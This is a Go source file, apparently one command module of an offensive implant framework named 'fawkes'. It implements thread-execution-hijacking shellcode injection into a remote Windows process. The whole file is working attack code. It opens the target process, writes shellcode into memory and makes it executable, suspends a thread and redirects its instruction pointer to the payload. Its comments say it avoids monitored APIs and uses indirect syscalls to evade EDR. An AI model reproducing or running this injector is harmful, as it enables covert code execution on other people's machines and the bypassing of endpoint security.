//go:build windows
// +build windows

// Package commands provides the thread-hijack command for thread execution hijacking injection.
//
// Thread hijacking suspends an existing thread in a remote process, modifies its
// instruction pointer (RIP) to point to injected shellcode, and resumes execution.
// This avoids creating new threads (CreateRemoteThread/NtCreateThreadEx) which are
// heavily monitored by EDR solutions.
//
// When indirect syscalls are active, uses Nt* APIs via indirect stubs for:
// NtOpenProcess, NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory,
// NtOpenThread, NtGetContextThread, NtSetContextThread, NtResumeThread
//
// Pipeline:
//  1. Open target process
//  2. Allocate RW memory, write shellcode, change to RX (W^X)
//  3. Enumerate threads via CreateToolhelp32Snapshot
//  4. Select target thread (user-specified TID or auto-select)
//  5. Open and suspend thread
//  6. Get thread context, save original RIP
//  7. Set RIP to shellcode address
//  8. Set modified context and resume thread
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"
)

// ThreadHijackCommand implements the thread-hijack command
type ThreadHijackCommand struct{}

// Name returns the command name
func (c *ThreadHijackCommand) Name() string {
	return "thread-hijack"
}

// Description returns the command description
func (c *ThreadHijackCommand) Description() string {
	return "Inject shellcode via thread execution hijacking (suspend, modify RIP, resume)"
}

// ThreadHijackParams represents the parameters for thread-hijack
type ThreadHijackParams struct {
	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode
	PID          int    `json:"pid"`           // Target process ID
	TID          int    `json:"tid"`           // Target thread ID (0 = auto-select)
}

// Execute executes the thread-hijack command
func (c *ThreadHijackCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params ThreadHijackParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := performThreadHijack(shellcode, uint32(params.PID), uint32(params.TID))
	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Thread hijack failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// performThreadHijack executes the thread hijacking injection pipeline
func performThreadHijack(shellcode []byte, pid, tid uint32) (string, error) {
	var sb strings.Builder
	var err error

	sb.WriteString("[*] Thread Hijack Injection starting\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", pid))

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	var hProcess uintptr
	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls\n")
		status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(pid))
		if status != 0 {
			return sb.String(), fmt.Errorf("NtOpenProcess failed: NTSTATUS 0x%X", status)
		}
	} else {
		hProcess, _, err = procOpenProcess.Call(uintptr(desiredAccess), 0, uintptr(pid))
		if hProcess == 0 {
			return sb.String(), fmt.Errorf("OpenProcess failed: %v", err)
		}
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString(fmt.Sprintf("[+] Opened process handle: 0x%X\n", hProcess))

	// Step 2: Allocate + write shellcode with W^X pattern (RW → RX)
	var scAddr uintptr
	scAddr, err = injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
	if err != nil {
		return sb.String(), fmt.Errorf("failed to inject shellcode: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Shellcode written at: 0x%X (W^X enforced)\n", scAddr))

	// Step 3: Find target thread
	targetTID := tid
	if targetTID == 0 {
		// Auto-select: find first thread that isn't the main thread
		targetTID, err = findHijackableThread(pid)
		if err != nil {
			return sb.String(), fmt.Errorf("failed to find hijackable thread: %v", err)
		}
		sb.WriteString(fmt.Sprintf("[+] Auto-selected thread TID: %d\n", targetTID))
	} else {
		sb.WriteString(fmt.Sprintf("[*] Using specified TID: %d\n", targetTID))
	}

	// Step 4: Open thread
	threadAccess := uint32(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT)
	var hThread uintptr
	if IndirectSyscallsAvailable() {
		sb.WriteString("[*] Using indirect syscalls\n")
		status := IndirectNtOpenThread(&hThread, threadAccess, uintptr(targetTID))
		if status != 0 {
			return sb.String(), fmt.Errorf("NtOpenThread failed: NTSTATUS 0x%X", status)
		}
	} else {
		hThread, _, err = procOpenThread.Call(uintptr(threadAccess), 0, uintptr(targetTID))
		if hThread == 0 {
			return sb.String(), fmt.Errorf("OpenThread failed: %v", err)
		}
	}
	defer injectCloseHandle(hThread)
	sb.WriteString(fmt.Sprintf("[+] Opened thread handle: 0x%X\n", hThread))

	// Step 5: Suspend thread
	prevCount, _, err := procSuspendThread.Call(hThread)
	if int32(prevCount) == -1 {
		return sb.String(), fmt.Errorf("SuspendThread failed: %v", err)
	}
	sb.WriteString(fmt.Sprintf("[+] Thread suspended (previous suspend count: %d)\n", prevCount))

	// Step 6: Get thread context
	var ctx CONTEXT_AMD64
	ctx.ContextFlags = CONTEXT_ALL_FLAGS
	if IndirectSyscallsAvailable() {
		status := IndirectNtGetContextThread(hThread, uintptr(unsafe.Pointer(&ctx)))
		if status != 0 {
			// Resume thread before returning on error
			resumeThread(&sb, hThread)
			return sb.String(), fmt.Errorf("NtGetContextThread failed: NTSTATUS 0x%X", status)
		}
	} else {
		ret, _, err := procGetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
		if ret == 0 {
			resumeThread(&sb, hThread)
			return sb.String(), fmt.Errorf("GetThreadContext failed: %v", err)
		}
	}
	originalRip := ctx.Rip
	sb.WriteString(fmt.Sprintf("[+] Original RIP: 0x%X\n", originalRip))

	// Step 7: Modify RIP to point to shellcode
	ctx.Rip = uint64(scAddr)
	sb.WriteString(fmt.Sprintf("[+] New RIP: 0x%X\n", ctx.Rip))

	// Step 8: Set modified context
	if IndirectSyscallsAvailable() {
		status := IndirectNtSetContextThread(hThread, uintptr(unsafe.Pointer(&ctx)))
		if status != 0 {
			resumeThread(&sb, hThread)
			return sb.String(), fmt.Errorf("NtSetContextThread failed: NTSTATUS 0x%X", status)
		}
	} else {
		ret, _, err := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
		if ret == 0 {
			resumeThread(&sb, hThread)
			return sb.String(), fmt.Errorf("SetThreadContext failed: %v", err)
		}
	}
	sb.WriteString("[+] Thread context updated\n")

	// Step 9: Resume thread
	resumeThread(&sb, hThread)

	sb.WriteString("[+] Thread hijack injection completed successfully\n")
	return sb.String(), nil
}

// resumeThread resumes a suspended thread, using indirect syscalls when available
func resumeThread(sb *strings.Builder, hThread uintptr) {
	if IndirectSyscallsAvailable() {
		var prevCount uint32
		status := IndirectNtResumeThread(hThread, &prevCount)
		if status != 0 {
			sb.WriteString(fmt.Sprintf("[!] NtResumeThread failed: NTSTATUS 0x%X\n", status))
			return
		}
		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
	} else {
		prevCount, _, _ := procResumeThread.Call(hThread)
		if int32(prevCount) == -1 {
			sb.WriteString("[!] ResumeThread failed\n")
			return
		}
		sb.WriteString(fmt.Sprintf("[+] Thread resumed (previous suspend count: %d)\n", prevCount))
	}
}

// findHijackableThread enumerates threads in a process and returns the first
// non-main thread suitable for hijacking. Uses CreateToolhelp32Snapshot.
func findHijackableThread(pid uint32) (uint32, error) {
	snapshot, _, err := procCreateToolhelp32Snapshot.Call(uintptr(TH32CS_SNAPTHREAD), 0)
	if snapshot == uintptr(^uintptr(0)) { // INVALID_HANDLE_VALUE
		return 0, fmt.Errorf("CreateToolhelp32Snapshot failed: %v", err)
	}
	defer injectCloseHandle(snapshot)

	var entry THREADENTRY32
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, err := procThread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	if ret == 0 {
		return 0, fmt.Errorf("Thread32First failed: %v", err)
	}

	var mainTID uint32
	var candidates []uint32

	for {
		if entry.OwnerProcessID == pid {
			if mainTID == 0 {
				// First thread found is likely the main thread
				mainTID = entry.ThreadID
			} else {
				candidates = append(candidates, entry.ThreadID)
			}
		}

		entry.Size = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procThread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
		if ret == 0 {
			break
		}
	}

	if len(candidates) > 0 {
		return candidates[0], nil
	}

	// No non-main threads found — fall back to main thread
	if mainTID != 0 {
		return mainTID, nil
	}

	return 0, fmt.Errorf("no threads found for PID %d", pid)
}
